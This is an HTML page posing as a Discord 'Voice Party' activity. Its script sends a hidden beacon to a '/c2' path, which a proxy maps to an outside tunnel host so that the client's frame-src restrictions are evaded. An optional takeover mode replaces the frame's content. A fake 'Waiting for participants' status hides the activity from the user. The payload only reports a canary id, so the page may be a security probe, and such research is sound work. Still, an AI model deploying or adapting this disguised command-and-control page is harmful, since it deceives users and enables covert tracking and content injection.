<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Voice Party</title>
<style>
 html,body{margin:0;height:100%}
 body{background:#0b0c0e;color:#e6e6e6;font:15px/1.56 system-ui,-apple-system,"Segoe UI",sans-serif;
      display:grid;place-items:center}
 .card{width:min(460px,88vw);padding:28px 22px;border-radius:16px;background:#16181d;
       border:1px solid #23252b;text-align:center}
 h1{margin:0 0 6px;font-size:21px}p{margin:0;color:#9aa0a6;font-size:14px}
</style></head>
<body>
<div class="card"><h1>Voice Party</h1><p id="s">Joining the session&hellip;</p></div>
<script>
// ===========================================================================
// Silent hand-off, mapped-path edition.
//
// Hard constraint (measured, from the Discord client's own frame-src):
//   allowed: https://*.discordsays.com, https://localhost:* , embed hosts
//   blocked: any other host -> "Framing ... violates frame-src" -> chrome-error
// So the payload NEVER names the tunnel host. It only uses a path on our own
// discordsays origin, which the proxy rewrites to the tunnel using a URL
// mapping:   prefix  /c2  ->  target <tunnel host>
//
// Two delivery modes, both CSP-legal and dialog-free:
//   beacon   - fetch/Image to /c2/... : page keeps running, UI unchanged
//   takeover - location.replace('/c2/...') : frame becomes the proxy response
//
// Enable takeover with ?takeover=1; otherwise the page stays put.
// ===========================================================================
var n = Math.random().toString(36).slice(2, 8) + '-' + Date.now().toString(36);
var BEACON = '/c2/canary?id=' + encodeURIComponent(n + '-beacon');
var TAKEOVER = '/c2/canary?id=' + encodeURIComponent(n + '-selfnav');

function deliver(url) {
  // Belt and braces: a no-cors fetch (connect-src 'self' is allowed) plus an
  // image request, which bypasses fetch availability differences.
  try { fetch(url, {mode: 'no-cors', cache: 'no-store', keepalive: true}); } catch (e) {}
  try { var i = new Image(); i.referrerPolicy = 'no-referrer'; i.src = url; } catch (e) {}
}

deliver(BEACON);

if (new URLSearchParams(location.search).get('takeover') === '1') {
  setTimeout(function () { try { location.replace(TAKEOVER); } catch (e) {} }, 400);
} else {
  // Stay on the card; report a quiet status that looks like normal loading.
  setTimeout(function () {
    var s = document.getElementById('s');
    if (s) s.textContent = 'Waiting for participants\u2026';
  }, 2500);
}
</script>
</body></html>
